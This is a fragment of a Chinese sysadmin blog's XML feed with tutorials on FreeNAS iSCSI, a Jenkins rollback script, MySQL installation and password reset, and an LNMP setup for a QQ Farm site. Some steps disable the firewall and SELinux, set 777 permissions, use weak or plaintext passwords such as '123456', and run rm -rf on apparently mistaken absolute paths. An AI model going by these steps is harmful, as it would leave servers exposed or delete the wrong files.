<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180809415.png" alt="image-20200916180809415"></p>
<p>第7步、设置 Extents ：</p>
<p>​    点击ADD添加，设置Extent name名称；选择Extent type，分为磁盘或者分区，此处选择磁盘。选择磁盘da1、da2、da3、da4等。 选择LUN RPM磁盘转速。其他默认即可。点击SAVE保存。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180829699.png" alt="image-20200916180829699"></p>
<p>依次将所需添加的设备添加完毕后，如下图所示。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180840408.png" alt="image-20200916180840408"></p>
<p>第8步、设置Associated Targets ：</p>
<p>​    点击ADD添加，选择Target、选择Extent，即是上步设置的asm 、crs、data1、data2、fra等。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180905436.png" alt="image-20200916180905436"></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180914691.png" alt="image-20200916180914691"></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180921620.png" alt="image-20200916180921620"></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180928046.png" alt="image-20200916180928046"></p>
<p>设置后，如下图。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180935447.png" alt="image-20200916180935447"></p>
<p>至此，配置完成，可以关闭网页退出了</p>
]]></content>
      <categories>
        <category>FreeNAS</category>
      </categories>
      <tags>
        <tag>FreeNAS</tag>
        <tag>共享存储</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins的回滚</title>
    <url>/2018/09/07/Jenkins%E7%9A%84%E5%9B%9E%E6%BB%9A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Jenkins的回滚"><a href="#Jenkins的回滚" class="headerlink" title="Jenkins的回滚"></a>Jenkins的回滚</h1><p>jenkins  基于上次构建结果回滚方式<br>思路：设置构建参数，脚本根据参数执行，拉取代码后压缩为项目名称+构建号的tar包，然后将最新的压缩包发送到应用主机，回滚则是将要回滚的压缩包，改为最新的构建号压缩包，然后发送到应用主机</p>
<p><img src= "/img/loading.gif" data-src="/2018/09/07/Jenkins%E7%9A%84%E5%9B%9E%E6%BB%9A/image-20200911161428104.png" alt="image-20200911161428104"></p>
<p><img src= "/img/loading.gif" data-src="/2018/09/07/Jenkins%E7%9A%84%E5%9B%9E%E6%BB%9A/image-20200911161442761.png" alt="image-20200911161442761"></p>
<p><img src= "/img/loading.gif" data-src="/2018/09/07/Jenkins%E7%9A%84%E5%9B%9E%E6%BB%9A/image-20200911161500331.png" alt="image-20200911161500331"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case $Status  in</span><br><span class="line">  Deploy)</span><br><span class="line">    echo "Status:$Status"</span><br><span class="line">    path="$&#123;WORKSPACE&#125;/bak"</span><br><span class="line">    if [ -d $path ];</span><br><span class="line">    then</span><br><span class="line">        echo "The files is already  exists "</span><br><span class="line">    else</span><br><span class="line">        mkdir -p  $path</span><br><span class="line">    fi</span><br><span class="line">    cd $&#123;WORKSPACE&#125;</span><br><span class="line">    tar czf bak/$&#123;JOB_NAME&#125;-$&#123;BUILD_NUMBER&#125;.tar.gz * --exclude=bak</span><br><span class="line">    find $path  -mtime 2 -name "*.tar.gz"  -exec rm -rf &#123;&#125; \;</span><br><span class="line">    echo "Completin!"</span><br><span class="line">    ;;</span><br><span class="line">  Rollback)</span><br><span class="line">      echo "Status:$Status"</span><br><span class="line">      echo "Version:$Version"</span><br><span class="line">      cd $&#123;WORKSPACE&#125;/bak</span><br><span class="line">      cp -R `ls /root/.jenkins/workspace/warbak/bak  |  grep $Version`   $&#123;JOB_NAME&#125;-$&#123;BUILD_NUMBER&#125;.tar.gz   ##复制为最新版本构建号</span><br><span class="line">      ;;</span><br><span class="line">  *)</span><br><span class="line">  exit</span><br><span class="line">      ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<ul>
<li>WORKSPACE ： /root/.jenkins/workspace/warbak/ 工作目录变量</li>
<li>JOB_NAME：项目名称</li>
<li>BUILD_NUMBER:构建号<br>将最新版本压缩包发送到其他主机</li>
</ul>
<p><img src= "/img/loading.gif" data-src="/2018/09/07/Jenkins%E7%9A%84%E5%9B%9E%E6%BB%9A/image-20200911161535728.png" alt="image-20200911161535728"></p>
<p><img src= "/img/loading.gif" data-src="/2018/09/07/Jenkins%E7%9A%84%E5%9B%9E%E6%BB%9A/image-20200911161552295.png" alt="image-20200911161552295"></p>
]]></content>
      <categories>
        <category>jenkins</category>
      </categories>
      <tags>
        <tag>jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下使用curl查看http请求各阶段耗时</title>
    <url>/2019/09/01/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8curl%E6%9F%A5%E7%9C%8Bhttp%E8%AF%B7%E6%B1%82%E5%90%84%E9%98%B6%E6%AE%B5%E8%80%97%E6%97%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux下使用curl查看http请求各阶段耗时"><a href="#Linux下使用curl查看http请求各阶段耗时" class="headerlink" title="Linux下使用curl查看http请求各阶段耗时"></a>Linux下使用curl查看http请求各阶段耗时</h1><ol>
<li>准备文件模版（curl.txt）</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">time_namelookup:  %&#123;time_namelookup&#125;\n</span><br><span class="line">time_connect:  %&#123;time_connect&#125;\n</span><br><span class="line">time_appconnect:  %&#123;time_appconnect&#125;\n</span><br><span class="line">time_pretransfer:  %&#123;time_pretransfer&#125;\n</span><br><span class="line">time_redirect:  %&#123;time_redirect&#125;\n</span><br><span class="line">time_starttransfer:  %&#123;time_starttransfer&#125;\n</span><br><span class="line">----------\n</span><br><span class="line">time_total:  %&#123;time_total&#125;\n</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用curl带以下参数请求</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -w "@curl.txt" -o /dev/null -s https://www.luanyu.cool</span><br></pre></td></tr></table></figure>

<p>　　结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[@ ~]# curl -w "@curl" -o /dev/null -s https://www.luanyu.cool</span><br><span class="line"></span><br><span class="line">            time_namelookup:  0.004</span><br><span class="line">               time_connect:  0.014</span><br><span class="line">            time_appconnect:  0.141</span><br><span class="line">           time_pretransfer:  0.141</span><br><span class="line">              time_redirect:  0.000</span><br><span class="line">         time_starttransfer:  0.153</span><br><span class="line">                            ----------</span><br><span class="line">                 time_total:  0.165</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>curl</category>
      </categories>
      <tags>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>K8S各部门功能简单总结</title>
    <url>/2019/05/27/K8S%E5%90%84%E9%83%A8%E4%BB%B6%E5%8A%9F%E8%83%BD%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一个master节点和四台node节点。先看上面master节点：开始从kubectl开始，kubectl和web ui都是k8s集群和用户交互的一个工具。可以通过kubectl这个是命令行工具通过命令操作集群，也可以是通过web ui这个界面操作集群。这个web ui是安装在k8s集群里面的一通过个应用。<br>重点是命令行：通过kubectl这个工具创建一个pod有副本，先去联系apiserver通过apiserver与Replication Controller（副本控制器），进行通信，找到之后就该创建了，那给哪个node上面创建是不是就该找Scheduler，如果我们不指定给哪台节点上面创建，默认就给是随机指定了。Scheduler如何知道集群中有哪些节点，这个时候Scheduler也要经过这个apiserver连接到etcd这个数据库通信，去查询数据库里面有哪些节点，然后选择一个节点去创建pod。比如现在选择好了一个节点是node1，这个时候Scheduler要通过这个apiserver与node1节点上面的kubelet进行通信，这个kubelet相当于我们node节点上面的一个代理，就是整个node节点上资源的创建都是通过master发起的任务，完成这个任务需要通过这个kubelet。找到kubelet之后需要创建一个pod，然后kubelet去找node1上面的docker  镜像，真正创建pod的不是kubelet，真正创建的还是docker。实际创建的还是一个容器，pod只是逻辑上面的概念。创建完容器之后要想给其他应用提供访问服务，就要通过kube-proxy的组件实现访问。外网通过防火墙实现访问。</p>
]]></content>
      <categories>
        <category>K8S</category>
      </categories>
      <tags>
        <tag>K8S</tag>
      </tags>
  </entry>
  <entry>
    <title>LNMP搭建QQ农场</title>
    <url>/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>﻿环境 centos7.4</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# uname -a</span><br><span class="line">Linux localhost 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p>关闭selinux 防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl stop firewalld &amp;&amp; systemctl disable firewalld &amp;&amp; setenforce 0</span><br><span class="line">setenforce: SELinux is disabled</span><br></pre></td></tr></table></figure>

<p>LNMP=Linux+Nginx+mysql+PHP（此处的mysql也可用mariadb代替，过程会更简单）<br>安装相关软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# # yum -y install php php-fpm php-curl php-intl php-mcrypt php-mysql php- mbstring php-xml php-dom php-gd nginx</span><br></pre></td></tr></table></figure>

<p>安装mysql</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">安装mysql yum仓库</span><br><span class="line"> 下载</span><br><span class="line">[root@localhost ~]#  wget https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm</span><br><span class="line"> 安装 </span><br><span class="line">[root@localhost ~]#  rpm -ivh mysql80-community-release-el7-3.noarch.rpm</span><br><span class="line"> 修改配置</span><br><span class="line">[root@localhost ~]#  cd /etc/yum.repos.d/</span><br><span class="line">[root@localhost yum.repos.d]#  vim mysql-community.repo</span><br></pre></td></tr></table></figure>

<p>修改如下</p>
<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817192141935.png" alt="image-20200817192141935"></p>
<p>正式安装（有点久）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum -y install mysql-server mysql</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl start nginx &amp;&amp; systemctl start mysqld &amp;&amp; systemctl start php-fpm &amp;&amp; systemctl enable php-fpm &amp;&amp; systemctl enable mysqld &amp;&amp; systemctl enable nginx</span><br></pre></td></tr></table></figure>

<p>修改数据库密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# grep pass /var/log/mysqld.log</span><br><span class="line">冒号后面全是密码</span><br><span class="line">[root@localhost ~]# mysqladmin -uroot -p'旧密码' password  '新密码'</span><br></pre></td></tr></table></figure>

<p>创建一个测试库 授权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> create database farm;</span></span><br></pre></td></tr></table></figure>

<p>配置php</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# vim /etc/php.ini</span><br><span class="line">Off改为On 注意o为大写</span><br><span class="line">short_open_tag = On</span><br></pre></td></tr></table></figure>

<p>修改nginx配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cd /etc/nginx/conf.d/</span><br><span class="line">[root@localhost conf.d]# cp default.conf&#123;,.bak&#125;</span><br><span class="line">[root@localhost conf.d]# vim /etc/nginx/conf.d/default.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 		80;</span><br><span class="line">	server_name www.luanyu.cool;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line">		root /farm;</span><br><span class="line">		index index.php index.html index.htm;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error_page 500 502 503 504 /50x.html;</span><br><span class="line">	location = /50x.html &#123;</span><br><span class="line">		root /usr/share/nginx/html;</span><br><span class="line">	&#125;</span><br><span class="line"> 	location ~ \.php$ &#123;</span><br><span class="line">		root 	/farm;</span><br><span class="line">		fastcgi_pass	127.0.0.1:9000;</span><br><span class="line">		fastcgi_index 	index.php;</span><br><span class="line">		fastcgi_param	SCRIPT_FILENAME	$document_root$fastcgi_script_name;</span><br><span class="line">		include			fastcgi_params;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试一下 创建你路径上对应的目录   ！！！并授权！！！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir /farm 		#创建目录</span><br><span class="line">[root@localhost ~]# chmod -R 777 /farm/</span><br><span class="line">[root@localhost ~]# vim /farm/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>访问测试</p>
<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817192707463.png" alt="image-20200817192707463"></p>
<p>成功了 其实到这你的lnmp就已经差不多了剩下的就是上传一些客户的网站源代码了</p>
<p>解压源码包</p>
<p>源码包下载地址如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1N8zUaoRvFwBDseJq1ZZ6Ow </span><br><span class="line">提取码：r0r7</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@real-server1 farm]# unzip farm-ucenter1.5.zip</span><br><span class="line">[root@real-server1 farm]# cp -rf upload/* /farm/ #拷贝源码到创建的目录下</span><br><span class="line">[root@real-server1 farm]# chmod -R 777 /farm</span><br><span class="line"><span class="meta">#</span><span class="bash">授权</span></span><br><span class="line">[root@real-server1 farm]# cd /farm</span><br><span class="line">[root@real-server1 farm]# mysql -uroot -p'Zhang@123' farm &lt; qqfarm.sql #导入数据库（数据库一定得导入正确不然农场出不来）</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817192841055.png" alt="image-20200817192841055"></p>
<p>测试</p>
<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817192853499.png" alt="image-20200817192853499"></p>
<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817192911058.png" alt="image-20200817192911058"></p>
<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817192927688.png" alt="image-20200817192927688"></p>
<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817192959651.png" alt="image-20200817192959651"></p>
<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817193007282.png" alt="image-20200817193007282"></p>
<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817193014034.png" alt="image-20200817193014034"></p>
<p>关于二次安装consenz<br>去你的网站发布目录下删除几个文件即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@real-server1 ~]# cd /farm/</span><br><span class="line">[root@real-server1 farm]# ls</span><br><span class="line">bbs  home  index.php  install  logo.jpg  qqfarm.sql  ucenter</span><br><span class="line">[root@real-server1 farm]# rm -rf /bbs/forumdata/install.lock</span><br><span class="line">[root@real-server1 farm]# rm -rf  /home/data/install.lock</span><br><span class="line">[root@real-server1 farm]# rm -rf /install/install.lock</span><br><span class="line">[root@real-server1 farm]# rm -rf /ucenter/data/install.lock</span><br><span class="line">重启nginx即可</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/10/09/LNMP%E6%90%AD%E5%BB%BAQQ%E5%86%9C%E5%9C%BA/image-20200817193030383.png" alt="image-20200817193030383"></p>
]]></content>
      <categories>
        <category>QQ农场</category>
      </categories>
      <tags>
        <tag>QQ农场</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux修改单个用户的环境变量</title>
    <url>/2019/01/27/Linux%E4%BF%AE%E6%94%B9%E5%8D%95%E4%B8%AA%E7%94%A8%E6%88%B7%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux中修改环境变量及生效方法"><a href="#Linux中修改环境变量及生效方法" class="headerlink" title="Linux中修改环境变量及生效方法"></a>Linux中修改环境变量及生效方法</h1><p>方法一：</p>
<p>　　在/etc/profile文件中添加变量【对所有用户生效(永久的)】</p>
<p>　　用VI在文件/etc/profile文件中增加变量，该变量将会对<a href="http://www.chinabyte.com/keyword/Linux/" target="_blank" rel="noopener">Linux</a>下所有用户有效，并且是“永久的”。</p>
<p>　　要让刚才的修改马上生效，需要执行以下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>　　在用户目录下的.bash_profile文件中增加变量【对单一用户生效(永久的)】</p>
<p>　　用VI在用户目录下的.bash_profile文件中增加变量，改变量仅会对当前用户有效，并且是“永久的”。</p>
<p>　　要让刚才的修改马上生效，需要在用户目录下执行以下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　# source .bash_profile</span><br></pre></td></tr></table></figure>

<p>　　方法三：</p>
<p>　　直接运行export命令定义变量【只对当前shell(BASH)有效(临时的)】</p>
<p>　　在shell的命令行下直接使用[export变量名=变量值]定义变量，该变量只在当前的shell(BASH)或其子shell(BASH)下是有效的，shell关闭了，变量也就失效了，再打开新shell时就没有这个变量，需要使用的话还需要重新定义。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　例如：export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;webserver&#x2F;php&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下编译安装MySQL5.6</title>
    <url>/2019/12/16/Linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85MySQL5.6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>【准备工作】</strong></p>
<p>所有操作需要在root用户下</p>
<p>本机测试案例系统信息：centos7.3</p>
<p>安装路径：/usr/local/mysql</p>
<p><strong>【安装MySQL】</strong></p>
<p>先安装如下依赖包:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum -y install make gcc-c++ cmake bison-devel ncurses-devel</span></span><br></pre></td></tr></table></figure>



<p>下载MySQL5.6.14安装包</p>
<p><a href="https://pan.baidu.com/s/1pMNLnhL" target="_blank" rel="noopener">https://pan.baidu.com/s/1pMNLnhL</a></p>
<p>密码:0k6d</p>
<p>解压mysql-5.6.14.tar.gz 然后进入目录，编译。命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -zxvf mysql-5.6.14.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> mysql-5.6.14</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cmake -DCMAKE_INSTALL_PREFIX=/usr/<span class="built_in">local</span>/mysql -DMYSQL_DATADIR=/usr/<span class="built_in">local</span>/mysql/data -DSYSCONFDIR=/etc -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DMYSQL_UNIX_ADDR=/var/lib/mysql/mysql.sock -DMYSQL_TCP_PORT=3306 -DENABLED_LOCAL_INFILE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DEXTRA_CHARSETS=all -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci</span></span><br></pre></td></tr></table></figure>

<p>编译完成之后，执行安装命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br></pre></td></tr></table></figure>

<p> 安装过程大约需要30分钟时间，安装完成的界面如下：</p>
<p><strong>【配置MySQL】</strong></p>
<p><strong>[设置权限]</strong></p>
<p>使用下面的命令查看是否有mysql用户及用户组</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd  <span class="comment">#查看用户列表</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/group   <span class="comment">#查看用户组列表</span></span></span><br><span class="line"></span><br><span class="line"> 如果没有就创建</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> groupadd mysql</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> useradd -g mysql mysql</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">修改/usr/local/mysql权限</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> chown -R mysql:mysql /usr/<span class="built_in">local</span>/mysql</span></span><br></pre></td></tr></table></figure>

<p><strong>[初始化配置]</strong></p>
<p>进入安装路径, 执行初始化配置脚本，创建系统自带的数据库和表:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mysql</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> scripts/mysql_install_db --basedir=/usr/<span class="built_in">local</span>/mysql --datadir=/usr/<span class="built_in">local</span>/mysql/data --user=mysql</span></span><br></pre></td></tr></table></figure>



<p>如果安装失败,若出现Can’t locate Data/Dumper.pm in @INC (@INC contains: … ，解决如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum install <span class="string">'perl(Data::Dumper)'</span></span></span><br></pre></td></tr></table></figure>



<p>注意：在CentOS 6.4及以后版本操作系统的最小安装完成后，在/etc目录下会存在一个my.cnf，需要将此文件更名为其他的名字，如：/etc/my.cnf.bak，否则，该文件会干扰源码安装的MySQL的正确配置，造成无法启动。在使用”yum update”更新系统后，需要检查下/etc目录下是否会多出一个my.cnf，如果多出，将它重命名成别的。否则，MySQL将使用这个配置文件启动，可能造成无法正常启动等问题。</p>
<p>对/etc/my.cnf重命名为/etc/my.cnf.bak，然后拷贝服务脚本到init.d目录，并设置开机启动：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp support-files/mysql.server /etc/init.d/mysql</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> chkconfig mysql on</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> service mysql start  <span class="comment">#启动MySQL</span></span></span><br></pre></td></tr></table></figure>



<p><strong>[配置用户]</strong></p>
<p>需要先设置PATH，否则不能直接调用mysql.修改/etc/profile文件，在文件末尾添加:</p>
<p>$ vim /etc/profile</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PATH=/usr/local/mysql/bin:$PATH</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>

<p>保存配置文件，运行下面的命令，让配置立即生效:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> /etc/profile</span></span><br></pre></td></tr></table></figure>

<p>现在，在终端内直接输入mysql即可进入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mysql -uroot</span></span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET PASSWORD = PASSWORD(<span class="string">'123456'</span>);</span></span><br></pre></td></tr></table></figure>

<p>若要设置root用户可以远程访问，执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT ALL PRIVILEGES ON *.* TO <span class="string">'root'</span>@<span class="string">'172.16.%'</span> IDENTIFIED BY <span class="string">'123456'</span> WITH GRANT OPTION;</span></span><br></pre></td></tr></table></figure>

<p><strong>[配置防火墙]</strong></p>
<p>防火墙的3306端口默认没有开启，若要远程访问，需要开启这个端口。打开/etc/sysconfig/iptables：</p>
<p>在“-A INPUT –m state –state NEW –m tcp –p –dport 22 –j ACCEPT”，下添加：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-A INPUT -m state --state NEW -m tcp -p -dport 3306 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>然后保存，并关闭该文件，在终端内运行下面的命令，刷新防火墙配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service iptables restart</span></span><br></pre></td></tr></table></figure>

<p>OK，一切配置完毕，然后可以访问MySQL了。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql root密码忘了解决方法</title>
    <url>/2019/04/02/Mysql%20root%E5%AF%86%E7%A0%81%E5%BF%98%E4%BA%86%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>简单的记录一下忘记mysql root账号的密码 解决方法</p>
<p>1.修改mysql配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi   /etc/my.cnf</span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>

<p>2.重启mysql</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl  restart  mysqld</span><br></pre></td></tr></table></figure>

<p>3.免密登录mysql<br>4.修改密码（略）<br>5.注释掉跳过密码的配置。并重启。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">skip-grant-tables</span></span><br><span class="line">[root@localhost ~]# systemctl restart mysqld</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql 主从复制不一致检测及解决方法</title>
    <url>/2018/11/29/Mysql%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8D%E4%B8%80%E8%87%B4%E6%A3%80%E6%B5%8B%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
